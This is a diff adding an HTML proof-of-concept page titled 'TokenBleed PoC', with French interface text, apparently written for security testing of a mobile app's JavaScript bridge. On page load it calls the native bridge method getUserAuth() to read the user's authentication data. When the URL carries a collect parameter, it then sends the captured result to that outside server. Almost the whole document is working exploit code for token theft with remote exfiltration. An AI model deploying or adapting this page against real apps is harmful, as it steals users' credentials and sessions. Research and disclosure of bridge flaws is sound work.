@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>TokenBleed PoC</title>
+  <script src="https://unpkg.com/dsbridge@3.1.3/dist/dsbridge.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 860px;
+      margin: 40px auto;
+      padding: 0 16px;
+      color: #111827;
+      background: #f9fafb;
+    }
+    .card {
+      background: #ffffff;
+      border: 1px solid #e5e7eb;
+      border-radius: 12px;
+      padding: 20px;
+      box-shadow: 0 4px 18px rgba(0, 0, 0, 0.06);
+    }
+    h1 {
+      margin-top: 0;
+    }
+    pre {
+      white-space: pre-wrap;
+      word-break: break-word;
+      background: #111827;
+      color: #e5e7eb;
+      padding: 16px;
+      border-radius: 8px;
+      min-height: 140px;
+    }
+    button {
+      padding: 10px 14px;
+      border: 0;
+      border-radius: 8px;
+      background: #2563eb;
+      color: #fff;
+      cursor: pointer;
+      font-weight: 600;
+    }
+    .muted {
+      color: #4b5563;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>TokenBleed PoC</h1>
+    <p class="muted">
+      Cette page appelle le bridge natif expose par l'application et affiche la reponse de
+      <code>getUserAuth()</code>.
+    </p>
+    <p class="muted">
+      Tu peux ajouter <code>?collect=https://ton-serveur/collect</code> a l'URL de cette page
+      pour activer une collecte distante sans modifier le fichier.
+    </p>
+
+    <p>
+      <button id="run">Lancer getUserAuth()</button>
+    </p>
+
+    <pre id="output">En attente...</pre>
+  </div>
+
+  <script>
+    const output = document.getElementById("output");
+    const runButton = document.getElementById("run");
+    const params = new URLSearchParams(window.location.search);
+
+    function print(value) {
+      if (typeof value === "string") {
+        output.textContent = value;
+        return;
+      }
+
+      try {
+        output.textContent = JSON.stringify(value, null, 2);
+      } catch (err) {
+        output.textContent = String(value);
+      }
+    }
+
+    function normalizeResult(value) {
+      if (typeof value === "string") {
+        try {
+          return JSON.parse(value);
+        } catch (err) {
+          return { raw: value };
+        }
+      }
+
+      if (value && typeof value === "object") {
+        return value;
+      }
+
+      return { raw: String(value) };
+    }
+
+    function collect(result) {
+      const endpoint = params.get("collect") || "";
+      if (!endpoint) {
+        return;
+      }
+
+      fetch(endpoint, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          source: "tokenbleed-lab",
+          captured_at: new Date().toISOString(),
+          result: normalizeResult(result),
+          page_url: window.location.href
+        })
+      }).catch(function (err) {
+        console.log("Collecte indisponible:", err);
+      });
+    }
+
+    function runPoc() {
+      if (typeof dsBridge === "undefined") {
+        print("dsBridge est indisponible. Ouvre cette page a l'interieur de l'application vulnerable.");
+        return;
+      }
+
+      print("Bridge detecte. Appel de getUserAuth()...");
+      dsBridge.call("getUserAuth", {}, function (ret) {
+        print(normalizeResult(ret));
+        collect(ret);
+      });
+    }
+
+    runButton.addEventListener("click", runPoc);
+    window.addEventListener("load", runPoc);
+  </script>
+</body>
+</html>
